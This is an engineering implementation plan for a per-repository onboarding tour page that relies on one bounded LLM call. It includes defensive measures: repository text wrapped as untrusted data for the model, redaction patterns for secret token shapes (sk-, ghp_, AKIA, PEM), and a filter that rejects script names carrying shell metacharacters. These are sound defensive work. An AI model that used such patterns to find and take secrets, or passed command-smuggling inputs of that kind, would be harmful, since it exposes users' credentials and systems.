# Implementation Plan: Onboarding Tour

Status: approved · Date: 2026-10-22 · Modules: server, client (mcp: typecheck only) · Execution mode: multi-agent · Spec: SPEC-02 (`specs/onboarding/SPEC-02-onboarding-tour.md`)

## Goal
A per-repo "Onboarding Tour" page at `/repos/:repoId/onboarding-tour`. It shows five fixed sections built from deterministic index and checkout facts, and one explicit, bounded, structured LLM call writes the prose. Generation runs as an async job, with one running generation per repo and a 60 s cooldown. Every degraded state (flag off, failed or empty index, no clone, invalid or failed model output) shows an honest deterministic skeleton or status instead of hiding the failure.

## Non-goals
- Changing the add-repository flow at `/onboarding` (only its wrongly lit sidebar key is fixed).
- Raising `MAX_INDEXED_FILES`, deepening the clone, computing git hotness, or indexing non-JS/TS languages.
- Hand-editing the tour, per-user progress, a public share page, PDF/Markdown export, or any "Share link" control.
- An in-app code viewer for "Open"; cancelling a running generation; automatic regeneration on index refresh.
- Using Project Context documents (SPEC-01) as tour input.
- Fixing the pre-existing missing workspace check on `POST /repos/:id/resync` (handed to the security pass).

## Requirements (verified)
- RQ1 — Sidebar Workspace group order is Pull Requests → Onboarding Tour → Project Context — confirmed — source: SPEC-02/AC-1
- RQ2 — Selecting the tab opens the selected repo's tour and marks the tab active — confirmed — source: SPEC-02/AC-2
- RQ3 — On the add-repo page the tour tab is not active — confirmed — source: SPEC-02/AC-3
- RQ4 — No repo selected → "Select a repository" prompt — confirmed — source: SPEC-02/AC-4
- RQ5 — Heading "Onboarding for {repoName}", with the name in mono/accent style — confirmed — source: SPEC-02/AC-5
- RQ6 — Subline "Generated from index of {n} files · last refreshed {relative}", with the absolute time on hover — confirmed — source: SPEC-02/AC-6
- RQ7 — When the index is partial or skipped > 0 → "{n} of {m} files" plus a Partial index notice — confirmed — source: SPEC-02/AC-7
- RQ8 — Exactly five sections in a fixed order, in both the generated and the skeleton view — confirmed — source: SPEC-02/AC-8
- RQ9 — "ON THIS PAGE" highlights the section in view — confirmed — source: SPEC-02/AC-9
- RQ10 — Collapsible cards with a chevron that exposes aria-expanded; all expanded on first load — confirmed — source: SPEC-02/AC-10
- RQ11 — Stack, directories, endpoints, scripts and ranking are derived without a model call — confirmed — source: SPEC-02/AC-11
- RQ12 — Ordering by PageRank × (1 + hotness), or PageRank alone when hotness is unavailable — confirmed — source: SPEC-02/AC-12
- RQ13 — At most 25 critical paths, 25 reading entries and 3 first tasks, ranked and grounded — confirmed — source: SPEC-02/AC-13
- RQ14 — Every response path that is not in the index of the indexed commit is dropped — confirmed — source: SPEC-02/AC-14
- RQ15 — Run commands come only from detected files; non-derivable model commands are dropped — confirmed — source: SPEC-02/AC-15
- RQ16 — Numbers in "why" lines come from index facts — confirmed — source: SPEC-02/AC-16
- RQ17 — Complexity from importer count (≤3 Low, 4–10 Medium, >10 High; a directory is always Low) — assumed default — confirm (inherited from the spec) — source: SPEC-02/AC-17
- RQ18 — No run facts → "No run instructions found in this repo" and no commands — confirmed — source: SPEC-02/AC-18
- RQ19 — Exactly one structured model call per generation, defined in the plan as one *logical* structured call: schema reprompts off, adapter transport retries allowed (see decisions) — confirmed — source: SPEC-02/AC-19
- RQ20 — README, comments and excerpts are passed as delimited untrusted data — confirmed — source: SPEC-02/AC-20
- RQ21 — At most 4,000 chars per excerpt; `.env.example` names without values — assumed default — confirm (inherited from the spec) — source: SPEC-02/AC-21
- RQ22 — Invalid model output → discarded and recorded; skeleton with "AI output invalid" — confirmed — source: SPEC-02/AC-22
- RQ23 — Model failure or >60 s → skeleton with "AI summary unavailable" plus Retry — assumed default — confirm (inherited from the spec) — source: SPEC-02/AC-23
- RQ24 — Model text is rendered as Markdown without raw HTML, scripts or `javascript:` links — confirmed — source: SPEC-02/AC-24
- RQ25 — An invalid diagram is omitted and the section text is still shown — confirmed — source: SPEC-02/AC-25
- RQ26 — Skeleton: reason banner and facts-only sections, with a first-tasks placeholder — confirmed — source: SPEC-02/AC-26
- RQ27 — No checkout → "Repository not cloned yet" and no Regenerate — confirmed — source: SPEC-02/AC-27
- RQ28 — Index being built → "Indexing in progress", a 5 s poll, and generation only after it finishes — assumed default — confirm (inherited from the spec) — source: SPEC-02/AC-28
- RQ29 — Repo intel off → skeleton "Repository index is turned off" and no model call — confirmed — source: SPEC-02/AC-29
- RQ30 — Index failed → skeleton with the reason plus a "Re-analyze" action that requests a re-index — confirmed — source: SPEC-02/AC-30
- RQ31 — No supported files → "No supported source files indexed (…)"; run commands still shown — confirmed — source: SPEC-02/AC-31
- RQ32 — WHILE a **first** generation is in progress: skeleton placeholders, Regenerate disabled, elapsed time shown, replaced on success — confirmed — source: SPEC-02/AC-32 (as amended to "WHILE a first generation is in progress…")
- RQ33 — Regenerate starts one generation from the current index; the previous tour stays until the new one succeeds — confirmed — source: SPEC-02/AC-33
- RQ34 — One running generation per repo; concurrent requests get the running one back — confirmed — source: SPEC-02/AC-34
- RQ35 — A failed regeneration keeps the previous tour plus a failure banner — confirmed — source: SPEC-02/AC-35
- RQ36 — The tour is returned only to members of the repo's workspace; 404 for another workspace's repo — confirmed — source: SPEC-02/AC-36
- RQ37 — Index updated after the tour was generated → stale notice plus Regenerate — confirmed — source: SPEC-02/AC-37
- RQ38 — Reopening a persisted tour makes no model call — confirmed — source: SPEC-02/AC-38
- RQ39 — No tour → empty state with the exact copy and a "Generate onboarding tour" button with a plus icon; no call before the click — confirmed — source: SPEC-02/AC-39
- RQ40 — A new generation within 60 s of the previous start is rejected — assumed default — confirm (inherited from the spec) — source: SPEC-02/AC-40
- RQ41 — "Open" → GitHub blob at the indexed SHA, in a new tab, with no opener — assumed default — confirm (inherited from the spec) — source: SPEC-02/AC-42
- RQ42 — Copy strips the trailing `# comment` and announces "Copied" — assumed default — confirm (inherited from the spec) — source: SPEC-02/AC-43
- RQ43 — Each generation records status, reason, duration, tokens and run id; no excerpt or model text is logged — confirmed — source: SPEC-02/AC-44
- RQ44 — Finish or fail is announced via a live region, and focus stays on Regenerate — confirmed — source: SPEC-02/AC-45
- RQ45 — Generate with a checkout but no index → an index build is requested, the model call runs after it finishes, and "Indexing in progress" shows meanwhile — confirmed — source: SPEC-02/AC-46
- RQ46 — Generate with an existing index → no re-index; "Re-analyze" offered when stale — confirmed — source: SPEC-02/AC-47
- RQ47 — A section anchor in the URL → scroll to that section and expand it — confirmed — source: SPEC-02/AC-48
- RQ48 — No "Share link"; breadcrumb "Workspace > Onboarding Tour" — confirmed — source: SPEC-02/AC-49
- RQ49 — Activating a TOC item by click or keyboard → scroll it into view and expand it if collapsed — confirmed — source: SPEC-02/AC-50
- RQ50 — First tasks come from the same single call: at most 3, each a title plus one file or dir path; ungrounded ones are dropped — confirmed — source: SPEC-02/AC-51
- RQ51 — First-task cards are informational: no Open button, no click action — confirmed — source: SPEC-02/AC-52
- RQ52 — More than 8 entries → first 8 plus "Show all ({N})"; activating it expands in place and relabels it "Show less" — confirmed — source: SPEC-02/AC-53
- RQ53 — "Show less" collapses to 8 entries and relabels it "Show all ({N})" — confirmed — source: SPEC-02/AC-54
- RQ54 — 8 or fewer entries → no toggle — confirmed — source: SPEC-02/AC-55
- RQ55 — Model reasons only for the top 8 per list; entries 9–25 get a deterministic index fact — confirmed — source: SPEC-02/AC-56
- RQ56 — The skeleton applies the same 8 / Show all / Show less rule, with index facts only — confirmed — source: SPEC-02/AC-57
- RQ57 — An expanded list cut at 25 by the cap ends with the note "Top 25 of {M} indexed files by import rank" — confirmed — source: SPEC-02/AC-58
- RQ58 — Plan-level (security review F2/F4, not a spec AC): secret values in docker-compose.yml, package.json, README and file excerpts are redacted before the model call (secret keys matched on whole segments, so `author:` is kept; token shapes `sk-`, `ghp_`, `AKIA`, PEM redacted); model text echoing a redacted value of ≥4 chars (non-trivial) is dropped from the saved tour — source: security review (P3 F2, F4)
- RQ59 — Plan-level (security review F3, not a spec AC): the architecture summary is shown without external links or images (server strips link/image/URL syntax; client renders model Markdown with `a`/`img` disallowed); the vendored Markdown primitive keeps rendering links by default for other callers — source: security review (P3 F3)
- RQ60 — Plan-level (decision 3, user-confirmed): "indexing" = a queued/running INDEX/REFRESH/RESYNC job for the repo inside `INDEX_JOB_WINDOW_MS` (420 s); older job rows count as orphaned — source: plan decision (supports SPEC-02/AC-28)
- RQ61 — Plan-level (pr-self-review HIGH, not a spec AC): a package.json script is offered as `npm run <name>` only when its name is a plain script name (`^[A-Za-z0-9][\w:.-]*$`, e.g. `build`, `test:e2e`, `lint-fix`); names with spaces, `;`, `&&`, `|`, `$`, quotes or newlines are skipped, so they never reach the command list, the prompt or the Copy button — source: pr-self-review (supports SPEC-02/AC-15, AC-43)
- RQ62 — Plan-level (pr-self-review HIGH, refines S11 focus rule): focus moves to Regenerate only when a rendered empty state is left; the initial load of an existing tour (loading → generated/skeleton) does not move focus — source: pr-self-review (supports SPEC-02/AC-45)

## Open questions & recommendations
- Spec issues (non-blocking):
  - AC-32 vs AC-33 overlap on a regeneration. AC-32 is amended to "WHILE a first generation is in progress…" (`specs/onboarding/SPEC-02-onboarding-tour.md:89`). Skeleton placeholders appear only when no persisted tour exists; a regeneration keeps the previous tour, with Regenerate disabled and the elapsed time shown (S11 `pickView`).
  - AC-28 / AC-46 need an "indexing" state, but `IndexStatus` has none (`server/src/modules/repo-intel/types.ts:25`). The server derives it through `repoIntel.isIndexing` (S4). The 5 s poll targets the tour-state endpoint.
  - AC-37 "the index was updated" is defined as **the indexed commit changed**, not `updated_at` moved. `updated_at` is touched on every no-op resync (`server/src/modules/repo-intel/pipeline/incremental.ts:96-98`) and on every state write (`server/src/modules/repo-intel/repository.ts:328,342`). So `stale = tour.index.indexedSha !== indexState.lastIndexedSha`, with both non-empty (review B3).
  - AC-46 first build is verified: `runIncremental` delegates to `runFullIndex` without a state row (`incremental.ts:5,79`). The first build uses `INDEX_JOB_KIND` (`server/src/modules/repo-intel/constants.ts:7`).
- Technical decisions:
  - Generation execution → user answer: A. An async job plus the `onboarding_generations` table, with a partial unique running index and a cooldown driven by `started_at`.
  - Contract → user answer: A. A typed `OnboardingTour` contract and a server-only `OnboardingModelOutput`, plus a rewritten prompt; the old `Onboarding*` schemas are deleted from both copies. No consumers were found by `git grep` in `client/src`, `mcp/src`, `server/test` or `e2e`.
  - Indexing detection → user answer (confirmed in round 2): a **time-bounded jobs-queue read**. `isIndexing(repoId)` is true when a `jobs` row of kind INDEX/REFRESH/RESYNC for the repo is `queued` with `scheduledAt` inside the window, or `running` with `startedAt` inside the window. The `jobs` table has `scheduledAt` (default now, set at enqueue) and no `createdAt` (`server/src/db/schema/ops.ts:21-22`). The window is `INDEX_JOB_WINDOW_MS = 120_000 × (2 + 1) + 60_000 = 420_000`, derived from the JobRunner defaults `timeoutMs ?? 120_000` and `retries ?? 2` (`server/src/platform/jobs.ts:40-41`) plus a 60 s margin. Older rows count as orphaned: JobRunner is in-memory, and rows are never reset after a restart (`jobs.ts:55,60-62`). The first build goes through `INDEX_JOB_KIND`, chained on `done`. `startGeneration` returns 409 `indexing_in_progress` while indexing. Re-analyze reuses `POST /repos/:id/resync`. `Container.activeIndexRuns` from the previous revision is dropped.
  - AC-19 interpretation → plan decision. "Exactly one structured model call" means one `completeStructured` invocation with `maxRetries: 0`, so there are no schema reprompts (`server/src/adapters/llm/openai.ts:90-96`, `anthropic.ts:92-99`). Each adapter attempt is still wrapped in `withRetry` (`openai.ts:97`, `anthropic.ts:100`), which re-sends on 429/≥500/ECONNRESET/ETIMEDOUT/ENOTFOUND (`server/src/platform/resilience.ts:35-44`). Those transport re-sends are allowed and recorded in Risks (review M5).
- Recommendations:
  - The generate job handler never throws, because JobRunner retries handlers (`jobs.ts:41`) → accepted → S6.
  - Chain the generate job on the index job's `done`, outside the queue → accepted → S5.
  - Model input budget: README, `package.json`, the compose file and the first 4 reading-path files, each capped at 4,000 chars; `.env.example` names only → accepted → S3.
  - Regenerate uses `aria-disabled`, and focus moves to Regenerate when the empty state's CTA unmounts (AC-45, review m10) → accepted → S11.
  - `onboarding_generations.id` is a uuid PK, deviating from the `postgresql-table-design` BIGINT preference but matching every schema table (`server/src/db/schema/ops.ts:9`) → accepted → S2.
  - `resolveInside` and `isDirectory` move to `server/src/modules/_shared/checkout-fs.ts`, and `context/checkout.ts` re-exports them → accepted → S3.
  - Running generation rows older than `GENERATION_STALE_MS` are failed as `interrupted` lazily, and rows started before boot are failed at boot (review m8, m9) → accepted → S5, S6.
- Open: None.

## Context
- INSIGHTS applied:
  - server — the contracts are a duplicated copy, with no sync script (Codebase Patterns 2026-10-02) → S1 edits both copies identically, plus a `check` diff row.
  - server — `repos.clone_path` can point into another checkout (2026-10-10) → S3 reads files with `node:fs`; S5 treats a missing directory as not cloned (AC-27).
  - server — shared dev DB drift; `db:generate` hangs when not on a TTY (2026-10-02/06/10) → S2 generates with `< /dev/null` and hand-edits the SQL to `IF NOT EXISTS`. No `db:migrate` on the shared DB.
  - server — the `MockAuthProvider` default user `'u1'` is not a uuid (2026-10-06) → T10 seeds real users.
  - server — prompt observability via an allowlist (2026-10-16) → S6 logs from an explicit allowlist (AC-44).
  - client — `import type` only from `@devdigest/shared` (2026-10-06) → S10–S13 restate runtime lists locally.
- Constraints applied:
  - Shared contracts duplicated → S1 in W0; mcp typecheck row included.
  - The client uses `import type` only → S10–S13, plus a multiline `check` row.
  - Client styling uses CSS vars plus inline `style={{}}` and `styles.ts`; no Tailwind; copy in `client/messages/en/onboarding.json` → S8–S13.
  - Server onion: routes → service → repository. Repo-intel only via `container.repoIntel` (`server/src/platform/container.ts:146-150`); LLM via `container.llm` (`container.ts:195`) → S3–S7.
  - DB: schema plus `db:generate`; no `db:migrate` on the shared DB → S2.
  - reviewer-core untouched; tests by `test-writer` only.
- Reuse:
  - Structured LLM call pattern — `server/src/modules/conventions/service.ts:116-142`
  - `resolveFeatureModel` — `server/src/modules/settings/feature-models.ts:47`; `'onboarding'` feature id — `server/src/vendor/shared/contracts/platform.ts:45`
  - `StructuredRequest.maxRetries` / `timeoutMs` — `server/src/vendor/shared/adapters.ts:61-62`; schema miss → `ExternalServiceError(…, { raw })` — `server/src/adapters/llm/openai.ts:132`
  - `wrapUntrusted` — `server/src/platform/prompt.ts:6`; `renderPrompt` — `server/src/platform/prompts.ts:40`
  - `withTimeout` / `TimeoutError` — `server/src/platform/resilience.ts:6,13`
  - `AppError` / `NotFoundError` / `ValidationError` / `ExternalServiceError` — `server/src/platform/errors.ts:7-35`
  - `requireRepo` via `container.reposRepo.getById` — `server/src/modules/context/service.ts:33-37`, `server/src/modules/repos/repository.ts:36`
  - `resolveInside`, `isDirectory` — `server/src/modules/context/checkout.ts:19,74` (moved by S3)
  - `getContext` + `IdParams`; job registration at boot — `server/src/modules/repo-intel/routes.ts:15-16,29-30`
  - Index job handlers — `server/src/modules/repo-intel/service.ts:172-183`
  - `PinoLike` — `server/src/platform/run-logger.ts:21-26`
  - Repo-intel reads:
    - `getIndexState` — `service.ts:189`; no-data row has `lastIndexedSha: ''` — `service.ts:199`
    - `getCriticalPaths` — `service.ts:663` (5 roots; `BFS_DEPTH = 2`, `constants.ts:49`)
    - `isJunkPath` — `service.ts:650`
    - repository `getRankedPaths` (`repository.ts:449`), `getEdges` (`repository.ts:432`), `getFileFacts` (`repository.ts:534`)
    - `file_rank` columns — `server/src/db/schema/repo-intel.ts:112-114`
    - `symbols.path` — `server/src/db/schema/context.ts:68`
    - `jobs` columns — `server/src/db/schema/ops.ts:6-27`
  - Existing `onboarding` table — `server/src/db/schema/context.ts:120-126`
  - Module registry — `server/src/modules/index.ts:1-47`
  - `MockLLMProvider` — `server/src/adapters/mocks.ts:92-96`; RepoIntel fake via `as unknown as RepoIntel` — `server/test/conventions.it.test.ts:121`
  - Client:
    - `NAV` — `client/src/vendor/ui/nav.ts:21-28`; `resolveHref` (`_` placeholder) — `nav.ts:71-74`
    - `activeKeyFor` — `client/src/components/app-shell/helpers.ts:26-41`
    - repo page pattern — `client/src/app/repos/[repoId]/context/page.tsx`
    - hooks barrel — `client/src/lib/hooks/index.ts:4-16`
    - `useResyncRepoIntel` — `client/src/lib/hooks/repo-intel.ts:41`; `useRepos` — `client/src/lib/hooks/repos.ts:9`
    - `Markdown` (`skipHtml`) — `client/src/vendor/ui/primitives/Markdown.tsx:6-19`
    - `MermaidDiagram` — `client/src/components/mermaid-diagram/MermaidDiagram.tsx:22-59`
    - nav label — `client/messages/en/shell.json:19`
    - unused `onboarding` namespace — `client/messages/en/onboarding.json`

## Skills per module
| Module / zone | Skills (from routing table) |
|---|---|
| shared contracts (both vendor copies) | zod, typescript-expert |
| server DB schema / migration | drizzle-orm-patterns, postgresql-table-design |
| server routes | fastify-best-practices, onion-architecture, zod |
| server services / repositories / job wiring | onion-architecture, drizzle-orm-patterns, typescript-expert |
| client routes, pages, components | next-best-practices, react-best-practices, frontend-architecture |
| client tests (TW-client) | react-testing-library |
| any module | engineering-insights |

## Steps

### S1 — Replace the Onboarding contract with typed `OnboardingTour`   [module: server, client] [skills: zod, typescript-expert] [workstream: W0]
- Files:
  - modify `server/src/vendor/shared/contracts/knowledge.ts` — delete `OnboardingLink`, `OnboardingSection`, `Onboarding` (lines 28-47) and add the schemas below
  - modify `client/src/vendor/shared/contracts/knowledge.ts` — the identical change
  - modify `server/src/vendor/shared/index.ts` — doc comment at line 7: `Onboarding` → `OnboardingTour`
  - modify `client/src/vendor/shared/index.ts` — the same comment edit, if present
- Change (each schema is exported with its `z.infer` type):
  - `OnboardingSectionKey = z.enum(['architecture','critical_paths','run_locally','reading_path','first_tasks'])`
  - `OnboardingReason = z.enum(['flag_off','index_failed','no_data','no_supported_files','ai_output_invalid','ai_unavailable','interrupted'])`
  - `OnboardingRankedEntry = { path, rank: number, importers: int ≥0, endpoints: int ≥0, reason: string | null }`
  - `OnboardingRankedList = { entries: OnboardingRankedEntry[] (max 25), truncated: boolean }`
  - `OnboardingCommand = { command, comment: string | null, source: z.enum(['package_script','compose','env_example']) }`
  - `OnboardingFirstTask = { title, path, isDirectory: boolean, importers: int, complexity: z.enum(['low','medium','high']) }`
  - `OnboardingTour`:
    - `mode: z.enum(['generated','skeleton'])`, `reason: OnboardingReason.nullable()`
    - `architecture: { summary: string|null, diagram: string|null, stack: string[], topLevelDirs: string[] }`
    - `criticalPaths: OnboardingRankedList`, `readingPath: OnboardingRankedList`
    - `runLocally: { commands: OnboardingCommand[], envVars: string[] }`
    - `firstTasks: OnboardingFirstTask[] (max 3) | null`
    - `index: { filesIndexed, filesSkipped, status: z.enum(['full','partial','degraded','failed']), indexedSha: string, indexUpdatedAt: string }` — `indexedSha` may be `''` for a no-data index
    - `generatedAt: string | null` — null for a skeleton (review M6)
  - `OnboardingGeneration = { id: uuid, status: z.enum(['running','succeeded','failed']), phase: z.enum(['indexing','generating']).nullable(), reason: OnboardingReason.nullable(), startedAt, finishedAt: string|null }`
  - `OnboardingTourState = { cloned: boolean, repoIntelEnabled: boolean, indexing: boolean, tour: OnboardingTour | null, skeleton: OnboardingTour | null, latestGeneration: OnboardingGeneration | null, stale: boolean }`
  - `GenerateOnboardingResponse = { generation: OnboardingGeneration }`
- Acceptance: identical Onboarding blocks in both copies; `git grep -n "OnboardingSection\|OnboardingLink"` finds nothing; server, client and mcp typecheck.
- Tested by: T1
- ACs: SPEC-02/AC-8, SPEC-02/AC-13
- Covers: RQ8, RQ13
- Depends on: —

### S2 — Add the `onboarding_generations` table and migration   [module: server] [skills: drizzle-orm-patterns, postgresql-table-design] [workstream: W0]
- Files:
  - modify `server/src/db/schema/context.ts` — add `onboardingGenerations` after `onboarding` (line 126)
  - create `server/src/db/migrations/0020_<drizzle-name>.sql` plus `server/src/db/migrations/meta/*` (generated, then hand-edited)
- Change: `pgTable('onboarding_generations', …)`. Columns:
  - `id uuid pk defaultRandom`
  - `repoId uuid notNull → repos.id cascade`
  - `workspaceId uuid notNull → workspaces.id cascade`
  - `status text enum ['running','succeeded','failed'] notNull default 'running'`
  - `phase text enum ['indexing','generating']` (nullable)
  - `reason text`, `model text`, `tokensIn integer`, `tokensOut integer`, `durationMs integer` (all nullable)
  - `startedAt timestamptz defaultNow notNull`, `finishedAt timestamptz`

  Indexes and constraints:
  - `uniqueIndex('onboarding_generations_one_running_idx').on(t.repoId).where(sql\`status = 'running'\`)` (AC-34)
  - `index('onboarding_generations_repo_started_idx').on(t.repoId, t.startedAt)`
  - `check('onboarding_generations_status_ck', …)`

  Run `cd server && npx drizzle-kit generate < /dev/null`, then hand-edit to `CREATE TABLE IF NOT EXISTS` / `CREATE [UNIQUE] INDEX IF NOT EXISTS`. Guard every `ADD CONSTRAINT` with `DO $$ … EXCEPTION WHEN duplicate_object THEN null; END $$` (`server/INSIGHTS.md`, 2026-10-06).
- Acceptance: the journal has the entry; the partial unique index has `WHERE status = 'running'`; every CREATE is `IF NOT EXISTS`.
- Tested by: T14, T15 (via it tests)
- ACs: SPEC-02/AC-34, SPEC-02/AC-40, SPEC-02/AC-44
- Covers: RQ34, RQ40, RQ43
- Depends on: —

### S3 — Onboarding domain helpers, checkout facts, prompt input   [module: server] [skills: onion-architecture, typescript-expert, zod] [workstream: W1]
- Files:
  - create `server/src/modules/_shared/checkout-fs.ts` — move `isDirectory` and `resolveInside` verbatim from `server/src/modules/context/checkout.ts:19-26,74-95`
  - modify `server/src/modules/context/checkout.ts` — re-export both from `../_shared/checkout-fs.js` (context behaviour unchanged)
  - create `server/src/modules/onboarding/constants.ts`:
    - `LIST_CAP = 25`, `REASONED_ENTRIES = 8`, `FIRST_TASK_CAP = 3`
    - `EXCERPT_CHAR_CAP = 4000`, `EXCERPT_FILES = 4`
    - `LLM_TIMEOUT_MS = 60_000`, `COOLDOWN_MS = 60_000`
    - `GENERATION_STALE_MS = INDEX_JOB_WINDOW_MS + LLM_TIMEOUT_MS + 60_000` (imports the constant via the repo-intel barrel `server/src/modules/repo-intel/index.ts`; if it isn't exported there, restate it as `420_000` with a comment)
    - `GENERATE_JOB_KIND = 'onboarding-generate'`, `PROMPT_NAME = 'onboarding.system'`, `SCHEMA_NAME`
    - `SECTION_ORDER`
    - `COUNT_CLAIM_RE = /\b\d+\s+(files?|routes?|imports?|importers?|modules?|endpoints?|callers?)\b/i`
  - create `server/src/modules/onboarding/model-output.ts` — loose zod, no `.max()`:
    - `architecture: { summary: string, diagram: string|null }`
    - `criticalPathReasons` and `readingPathReasons`: each `{path, reason}[]`
    - `runCommands: string[]`
    - `firstTasks: {title, path}[]`
  - create `server/src/modules/onboarding/helpers.ts` — pure functions:
    - `fileRank(pagerank, hotness)` = `pagerank * (1 + (hotness || 0))` (AC-12)
    - `criticalCandidates(facts)`: chain files ∪ files with `endpoints > 0` ∪ files with `importers > 0`; non-junk, deduped, sorted by `fileRank` desc
    - `readingCandidates(facts)`: all ranked non-junk files by `fileRank`
    - `rankList(candidates, facts)`: first 25, `truncated = candidates.length > 25` (AC-13, AC-58)
    - `complexityFor(importers, isDirectory)` (AC-17)
    - `deriveCommands({ scripts, composeFile, envExampleNames })` (AC-15, AC-18)
    - `envNamesOnly`, `truncateExcerpt` (AC-21)
    - `isGroundedText(text, indexedPaths, allowlist)`: false if a backticked token, or a token with `/` and an extension, is neither indexed nor allowlisted. The allowlist is the top-level dirs plus `package.json`, `README.md`, compose files and `.env.example`.
    - `groundModelOutput(output, ctx)` (AC-14, AC-15, AC-16, AC-51):
      - drops reasons whose path is not indexed, reasons that fail `isGroundedText`, and reasons matching `COUNT_CLAIM_RE`. Only count claims are dropped, so `OAuth2`, `v1` and `http/2` survive (review M2 refinement); the numbers live in the separate deterministic fact line.
      - `summary` / `diagram` → `null` when they fail `isGroundedText`
      - drops non-derivable `runCommands`; persisted commands are always `deriveCommands`
      - drops ungrounded tasks
      - slices reasons to 8 and tasks to 3
    - `buildSkeleton(facts, reason)`:
      - `no_supported_files` iff `indexState.filesIndexed === 0`
      - `generatedAt: null`, `diagram: null`, `firstTasks: null`, all reasons null
      - AC-26, AC-31, AC-57
    - `mergeGenerated(skeleton, grounded, generatedAt)`: reasons for entries 1–8 only, tasks with importers and complexity, `mode: 'generated'`, `generatedAt` set (AC-56, AC-17)
  - create `server/src/modules/onboarding/checkout.ts`:
    - `cloneExists(clonePath)` via `isDirectory` (AC-27)
    - `readRunFacts(clonePath)`: `package.json` scripts and deps, `.env.example` names, compose file, capped README, top-level dirs
    - never throws
  - create `server/src/modules/onboarding/prompt-input.ts` — `buildModelMessages(facts, excerpts)`:
    - `renderPrompt`, plus `wrapUntrusted(label, truncateExcerpt(text))` for every excerpt
    - top 8 paths per list offered for reasons
    - lists the allowed commands and dirs
    - AC-20, AC-21, AC-56
  - modify `server/src/prompts/onboarding.system.md` — rewrite:
    - the five SPEC-02 sections and the `OnboardingModelOutput` fields
    - the `<untrusted>` rule
    - paths and commands only from the provided lists
    - no counts in reasons; no unprovided paths in the summary or diagram
    - up to 3 newcomer tasks
    - keep the `flowchart` mermaid rules; remove `{{sections}}`
- Change: domain/application ring; checkout IO in `checkout.ts`; no Drizzle or Fastify.
- Acceptance: helpers are pure; typechecks; context is unchanged.
- Tested by: T2, T3, T4, T5, T6, T7, T8, T35
- ACs: SPEC-02/AC-11, SPEC-02/AC-12, SPEC-02/AC-13, SPEC-02/AC-14, SPEC-02/AC-15, SPEC-02/AC-16, SPEC-02/AC-17, SPEC-02/AC-18, SPEC-02/AC-20, SPEC-02/AC-21, SPEC-02/AC-26, SPEC-02/AC-27, SPEC-02/AC-31, SPEC-02/AC-51, SPEC-02/AC-56, SPEC-02/AC-57, SPEC-02/AC-58
- Covers: RQ11, RQ12, RQ13, RQ14, RQ15, RQ16, RQ17, RQ18, RQ20, RQ21, RQ26, RQ27, RQ31, RQ50, RQ55, RQ56, RQ57
- Depends on: S1, S4 (for `INDEX_JOB_WINDOW_MS`)

### S4 — Repo-intel facade: tour facts, time-bounded indexing flag, index build request   [module: server] [skills: onion-architecture, drizzle-orm-patterns] [workstream: W1]
- Files:
  - modify `server/src/modules/repo-intel/constants.ts` — add `INDEX_JOB_WINDOW_MS = 120_000 * (2 + 1) + 60_000`, with a comment citing the JobRunner defaults at `server/src/platform/jobs.ts:40-41`
  - modify `server/src/modules/repo-intel/index.ts` — export `INDEX_JOB_WINDOW_MS`, if this barrel re-exports constants (confirm in Risks)
  - modify `server/src/modules/repo-intel/types.ts` — add to `interface RepoIntel` (line 137):
    - `getTourFacts(repoId): Promise<TourIndexFacts>`, where `TourIndexFacts = { ranked: {path, pagerank, hotness}[], indexedPaths: string[], importers: Record<string, number>, endpoints: Record<string, number>, criticalPathFiles: string[] }`
    - `isIndexing(repoId): Promise<boolean>`
    - `requestIndexBuild(workspaceId, repoId): Promise<{ done: Promise<void> }>`
  - modify `server/src/modules/repo-intel/repository.ts` — add:
    - `getRankRows(repoId)`
    - `getSymbolPaths(repoId)` (distinct `t.symbols.path`)
    - `countEndpointsByFile(repoId)`
    - `hasRecentActiveIndexJob(repoId, kinds, since: Date)`: on `t.jobs`, `kind in kinds AND payload->>'repoId' = repoId AND ((status='queued' AND scheduled_at > since) OR (status='running' AND started_at > since))`
  - modify `server/src/modules/repo-intel/service.ts`:
    - `isIndexing` → `hasRecentActiveIndexJob(repoId, [INDEX_JOB_KIND, REFRESH_JOB_KIND, RESYNC_JOB_KIND], new Date(Date.now() - INDEX_JOB_WINDOW_MS))`
    - `requestIndexBuild` → `container.jobs.enqueue(workspaceId, INDEX_JOB_KIND, { repoId })`, returning `{ done }`
    - `getTourFacts`:
      - empty facts when `!config.repoIntelEnabled`
      - `indexedPaths` = rank paths ∪ symbol paths, since partial indexes skip the rank step (`server/src/modules/repo-intel/pipeline/full.ts:211-214`)
      - importers from `getEdges`
      - `criticalPathFiles` from `getCriticalPaths`
- Change: facade only. The jobs read lives in the repo-intel repository, the module's only Drizzle file (flagged for architecture review).
- Acceptance: the interface is satisfied; existing `as unknown as RepoIntel` fakes still typecheck.
- Tested by: T9, T17, T37
- ACs: SPEC-02/AC-11, SPEC-02/AC-12, SPEC-02/AC-13, SPEC-02/AC-14, SPEC-02/AC-28, SPEC-02/AC-46
- Covers: RQ11, RQ12, RQ13, RQ14, RQ28, RQ45
- Depends on: —

### S5 — Onboarding repository and service (state, start generation)   [module: server] [skills: onion-architecture, drizzle-orm-patterns, typescript-expert] [workstream: W1]
- Files:
  - create `server/src/modules/onboarding/repository.ts`:
    - `getTourJson(repoId)`, `upsertTour(repoId, tour)` on `t.onboarding`
    - `insertRunning(workspaceId, repoId, phase)` → row, or `null` on `23505`
    - `getRunning(repoId)`, `getLatest(repoId)`, `setPhase(id, phase)`, `finish(id, {…})`
    - `failStaleRunning(olderThan: Date)`: sets `status='failed', reason='interrupted', finished_at=now()` where `status='running' AND started_at < olderThan`, optionally scoped to one repo
  - create `server/src/modules/onboarding/service.ts` — `class OnboardingService(container)`:
    - `requireRepo` → 404 for another workspace's repo (AC-36)
    - `getState(workspaceId, repoId)`:
      1. `failStaleRunning(now - GENERATION_STALE_MS, repoId)` first, so an orphaned row (one inserted but never enqueued) stops the client polling (review m9).
      2. `cloned = !!repo.clonePath && await cloneExists(repo.clonePath)` (AC-27).
      3. `tour = OnboardingTour.safeParse(json)`; failure → `null`.
      4. `indexing = await repoIntel.isIndexing(repoId) || (latest running && phase==='indexing')`.
      5. `skeleton` only when `tour === null && cloned && !indexing`; its reason is the latest failed generation's reason, else `flag_off` / `index_failed` / `no_data` / `no_supported_files`. No model call (AC-11, AC-29, AC-38).
      6. `stale = !!tour && !!tour.index.indexedSha && !!indexState.lastIndexedSha && tour.index.indexedSha !== indexState.lastIndexedSha` (AC-37, review B3).
    - `startGeneration(workspaceId, repoId)`, in this order:
      1. `failStaleRunning(now - GENERATION_STALE_MS, repoId)`.
      2. Not cloned → 422 (AC-27).
